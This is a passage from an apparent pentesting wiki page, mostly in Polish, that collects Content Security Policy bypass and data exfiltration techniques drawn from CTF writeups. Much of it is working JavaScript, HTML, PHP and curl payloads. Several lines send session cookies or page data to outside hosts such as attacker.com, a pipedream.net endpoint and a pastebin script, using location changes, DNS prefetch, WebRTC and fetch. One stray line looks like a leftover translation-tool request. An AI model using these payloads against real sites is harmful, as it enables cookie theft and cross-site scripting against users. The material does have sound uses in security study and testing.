In [**this CTF writeup**](https://github.com/google/google-ctf/tree/master/2023/web-biohazard/solution), CSP is bypassed by injecting inside an allowed iframe a more restrictive CSP that disallowed to load a specific JS file that, then, via **prototype pollution** or **dom clobbering** allowed to **abuse a different script to load an arbitrary script**.

You can **restrict a CSP of an Iframe** with the **`csp`** attribute:
```html
<iframe
src="https://biohazard-web.2023.ctfcompetition.com/view/[bio_id]"
csp="script-src https://biohazard-web.2023.ctfcompetition.com/static/closure-library/ https://biohazard-web.2023.ctfcompetition.com/static/sanitizer.js https://biohazard-web.2023.ctfcompetition.com/static/main.js 'unsafe-inline' 'unsafe-eval'"></iframe>
```
W [**this CTF writeup**](https://github.com/aszx87410/ctf-writeups/issues/48), możliwe było poprzez **HTML injection** dodatkowo **restrict** **CSP**, dzięki czemu skrypt zapobiegający CSTI został wyłączony i w konsekwencji **vulnerability became exploitable.**\
CSP można uczynić bardziej restrykcyjnym używając **HTML meta tags**, a inline scripts można wyłączyć poprzez **removing** **entry** umożliwiający ich **nonce** i **enable specific inline script via sha**:
```html
<meta
http-equiv="Content-Security-Policy"
content="script-src 'self'
'unsafe-eval' 'strict-dynamic'
'sha256-whKF34SmFOTPK4jfYDy03Ea8zOwJvqmz%2boz%2bCtD7RE4='
'sha256-Tz/iYFTnNe0de6izIdG%2bo6Xitl18uZfQWapSbxHE6Ic=';" />
```
### JS exfiltration z Content-Security-Policy-Report-Only

Jeśli uda ci się sprawić, że serwer odpowie nagłówkiem **`Content-Security-Policy-Report-Only`** z **wartością kontrolowaną przez ciebie** (np. z powodu CRLF), możesz sprawić, że będzie on wskazywał na twój serwer, a jeśli **opakujesz** **JS content**, który chcesz exfiltrate, w **`<script>`**, i ponieważ jest bardzo prawdopodobne, że `unsafe-inline` nie jest dozwolone przez CSP, spowoduje to **wywołanie błędu CSP**, a część skryptu (zawierająca wrażliwe informacje) zostanie wysłana do serwera przez `Content-Security-Policy-Report-Only`.

Dla przykładu [**zobacz ten CTF writeup**](https://github.com/maple3142/My-CTF-Challenges/tree/master/TSJ%20CTF%202022/Nim%20Notes).

### [CVE-2020-6519](https://www.perimeterx.com/tech-blog/2020/csp-bypass-vuln-disclosure/)
```javascript
document.querySelector("DIV").innerHTML =
'<iframe src=\'javascript:var s = document.createElement("script");s.src = "https://pastebin.com/raw/dw5cWGK6";document.body.appendChild(s);\'></iframe>'
```
### Leaking informacji przy użyciu CSP i Iframe

- Tworzony jest `iframe`, który wskazuje na URL (nazwijmy go `https://example.redirect.com`), który jest dozwolony przez CSP.
- Ten URL następnie przekierowuje do sekretnego URL (np. `https://usersecret.example2.com`), który jest **nie dozwolony** przez CSP.
- Nasłuchując zdarzenia `securitypolicyviolation`, można przechwycić właściwość `blockedURI`. Ta właściwość ujawnia domenę zablokowanego URI, leaking sekretną domenę, na którą przekierowywał początkowy URL.

Warto zauważyć, że przeglądarki takie jak Chrome i Firefox zachowują się inaczej w obsłudze iframe w kontekście CSP, co może prowadzić do potencjalnej leakage wrażliwych informacji z powodu nieokreślonego zachowania.

Inna technika polega na wykorzystaniu samego CSP do odgadnięcia sekretnej subdomeny. Ta metoda opiera się na algorytmie wyszukiwania binarnego i dostosowywaniu CSP tak, aby zawierał konkretne domeny, które są celowo zablokowane. Na przykład, jeśli sekretny subdomen składa się z nieznanych znaków, można iteracyjnie testować różne subdomeny, modyfikując dyrektywę CSP, aby zablokować lub zezwolić na te subdomeny. Oto fragment pokazujący, jak CSP może być skonfigurowane, aby ułatwić tę metodę:
```markdown
img-src https://chall.secdriven.dev https://doc-1-3213.secdrivencontent.dev https://doc-2-3213.secdrivencontent.dev ... https://doc-17-3213.secdriven.dev
```
Monitorując, które żądania są blokowane lub dozwolone przez CSP, można zawęzić możliwe znaki w sekretnej subdomenie, ostatecznie odsłaniając pełny URL.

Obie metody wykorzystują niuanse implementacji CSP i zachowanie przeglądarek, pokazując, jak pozornie bezpieczne polityki mogą niezamierzenie leak wrażliwe informacje.

Trick from [**here**](https://ctftime.org/writeup/29310).

## Niebezpieczne technologie do Bypass CSP

### PHP - błędy przy zbyt wielu params

Zgodnie z [**last technique commented in this video**](https://www.youtube.com/watch?v=Sm4G6cAHjWM), wysłanie zbyt wielu parametrów (1001 GET parameters chociaż można to też zrobić z POST params oraz przy >20 plikach). Każde zdefiniowane **`header()`** w kodzie PHP **nie zostanie wysłane** z powodu błędu, który to wywoła.

### Przepełnienie bufora odpowiedzi PHP

PHP jest znany z **buforowania odpowiedzi do 4096** bajtów domyślnie. Dlatego, jeśli PHP wygeneruje ostrzeżenie, dostarczając **wystarczająco dużo danych w tych ostrzeżeniach**, **odpowiedź** zostanie **wysłana** **przed** **CSP header**, powodując jego zignorowanie.\
Technika polega zasadniczo na **wypełnieniu bufora odpowiedzi ostrzeżeniami**, tak aby nagłówek CSP nie został wysłany.

Idea from [**this writeup**](https://hackmd.io/@terjanq/justCTF2020-writeups#Baby-CSP-web-6-solves-406-points).

### Wyłączenie CSP przez max_input_vars (headers already sent)

Ponieważ nagłówki muszą być wysłane przed jakimkolwiek outputem, ostrzeżenia generowane przez PHP mogą unieważnić późniejsze wywołania `header()`. Jeśli dane od użytkownika przekroczą `max_input_vars`, PHP najpierw zgłosi startup warning; każde późniejsze `header('Content-Security-Policy: ...')` zakończy się niepowodzeniem z komunikatem “headers already sent”, skutecznie wyłączając CSP i pozwalając na reflective XSS, które w innym wypadku byłyby zablokowane.
```php
<?php
header("Content-Security-Policy: default-src 'none';");
echo $_GET['xss'];
```
Proszę wklej zawartość pliku README.md (z katalogu src/pentesting-web/content-security-policy-csp-bypass/) do przetłumaczenia.
```bash
# CSP in place → payload blocked by browser
curl -i "http://orange.local/?xss=<svg/onload=alert(1)>"

# Exceed max_input_vars to force warnings before header() → CSP stripped
curl -i "http://orange.local/?xss=<svg/onload=alert(1)>&A=1&A=2&...&A=1000"
# Warning: PHP Request Startup: Input variables exceeded 1000 ...
# Warning: Cannot modify header information - headers already sent
```
### Przepisywanie strony błędu

Z [**this writeup**](https://blog.ssrf.kr/69) wynika, że możliwe było bypass zabezpieczenia CSP przez załadowanie strony błędu (potencjalnie bez CSP) i przepisanie jej zawartości.
```javascript
a = window.open("/" + "x".repeat(4100))
setTimeout(function () {
a.document.body.innerHTML = `<img src=x onerror="fetch('https://filesharing.m0lec.one/upload/ffffffffffffffffffffffffffffffff').then(x=>x.text()).then(x=>fetch('https://enllwt2ugqrt.x.pipedream.net/'+x))">`
}, 1000)
```
### SOME + 'self' + wordpress

SOME to technika, która wykorzystuje XSS (lub wysoce ograniczony XSS) **w endpointzie strony** do **nadużywania** **innych endpointów tej samej origin.** Odbywa się to przez załadowanie podatnego endpointu ze strony attacker i następnie odświeżenie strony attacker do prawdziwego endpointu w tej samej origin, którą chcesz nadużyć. W ten sposób **podatny endpoint** może użyć obiektu **`opener`** w **payload**, aby **uzyskać dostęp do DOM** prawdziwego endpointu, który ma być nadużyty. Więcej informacji sprawdź:

{{#ref}}
../xss-cross-site-scripting/some-same-origin-method-execution.md
{{#endref}}

Co więcej, **wordpress** ma endpoint **JSONP** w `/wp-json/wp/v2/users/1?_jsonp=data`, który będzie **odzwierciedlać** wysłane **data** w output (z ograniczeniem do liter, cyfr i kropek).

Attacker może wykorzystać ten endpoint, aby **wygenerować a SOME attack** przeciwko WordPress i **osadzić** go wewnątrz `<script s`rc=`/wp-json/wp/v2/users/1?_jsonp=some_attack></script>` — zwróć uwagę, że ten **script** zostanie **wczytany**, ponieważ jest **dozwolony przez 'self'**. Co więcej, i ponieważ WordPress jest zainstalowany, attacker może wykorzystać **SOME attack** przez podatny **callback** endpoint, który **bypasses the CSP**, aby nadać użytkownikowi większe uprawnienia, zainstalować nowy plugin...\
For more information about how to perform this attack check [https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/](https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/)

## CSP Exfiltration Bypasses

If there is a strict CSP that doesn't allow you to **interact with external servers**, there are some things you can always do to exfiltrate the information.

### Location

You could just update the location to send to the attacker's server the secret information:
```javascript
var sessionid = document.cookie.split("=")[1] + "."
document.location = "https://attacker.com/?" + sessionid
```
### Znacznik meta

Możesz przekierować, wstrzykując znacznik meta (to jest tylko przekierowanie, to nie spowoduje leak zawartości)
```html
<meta http-equiv="refresh" content="1; http://attacker.com" />
```
### DNS Prefetch

Aby szybciej ładować strony, przeglądarki będą wstępnie rozwiązywać nazwy hostów na adresy IP i buforować je do późniejszego użycia.\
Możesz wskazać przeglądarce, aby wstępnie rozwiązała nazwę hosta za pomocą: `<link rel="dns-prefetch" href="something.com">`

Możesz nadużyć tego zachowania, aby **exfiltrate sensitive information via DNS requests**:
```javascript
var sessionid = document.cookie.split("=")[1] + "."
var body = document.getElementsByTagName("body")[0]
body.innerHTML =
body.innerHTML +
'<link rel="dns-prefetch" href="//' +
sessionid +
'attacker.ch">'
```
Inny sposób:
```javascript
const linkEl = document.createElement("link")
linkEl.rel = "prefetch"
linkEl.href = urlWithYourPreciousData
document.head.appendChild(linkEl)
```
Aby temu zapobiec, serwer może wysłać nagłówek HTTP:
```
X-DNS-Prefetch-Control: off
```
> [!TIP]
> Najwyraźniej ta technika nie działa w headless browsers (bots)

### WebRTC

Na kilku stronach można przeczytać, że **WebRTC nie sprawdza polityki `connect-src` w CSP**.

W rzeczywistości możesz _leak_ informacje używając _DNS request_. Sprawdź ten kod:
```javascript
;(async () => {
p = new RTCPeerConnection({ iceServers: [{ urls: "stun:LEAK.dnsbin" }] })
p.createDataChannel("")
p.setLocalDescription(await p.createOffer())
})()
```
Inna opcja:
```javascript
var pc = new RTCPeerConnection({
"iceServers":[
{"urls":[
"turn:74.125.140.127:19305?transport=udp"
],"username":"_all_your_data_belongs_to_us",
"credential":"."
}]
});
pc.createOffer().then((sdp)=>pc.setLocalDescription(sdp);
```
### CredentialsContainer

Wyskakujące okienko poświadczeń wysyła zapytanie DNS do iconURL bez ograniczeń nałożonych przez stronę. Działa tylko w bezpiecznym kontekście (HTTPS) lub na localhost.
```javascript
navigator.credentials.store(
new FederatedCredential({
id:"satoki",
name:"satoki",
provider:"https:"+your_data+"example.com",
iconURL:"https:"+your_data+"example.com"
})
)
```
## Sprawdzanie polityk CSP online

- [https://csp-evaluator.withgoogle.com/](https://csp-evaluator.withgoogle.com)
- [https://cspvalidator.org/](https://cspvalidator.org/#url=https://cspvalidator.org/)

## Automatyczne tworzenie CSP

[https://csper.io/docs/generating-content-security-policy](https://csper.io/docs/generating-content-security-policy)

## Źródła

- [https://hackdefense.com/publications/csp-the-how-and-why-of-a-content-security-policy/](https://hackdefense.com/publications/csp-the-how-and-why-of-a-content-security-policy/)
- [https://lcamtuf.coredump.cx/postxss/](https://lcamtuf.coredump.cx/postxss/)
- [https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d](https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d)
- [https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy#allowed-data-scheme](https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy#allowed-data-scheme)
- [https://www.youtube.com/watch?v=MCyPuOWs3dg](https://www.youtube.com/watch?v=MCyPuOWs3dg)
- [https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/](https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/)
- [https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/](https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/)
- [https://cside.dev/blog/weaponized-google-oauth-triggers-malicious-websocket](https://cside.dev/blog/weaponized-google-oauth-triggers-malicious-websocket)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)

​

{{#include ../../banners/hacktricks-training.md}}
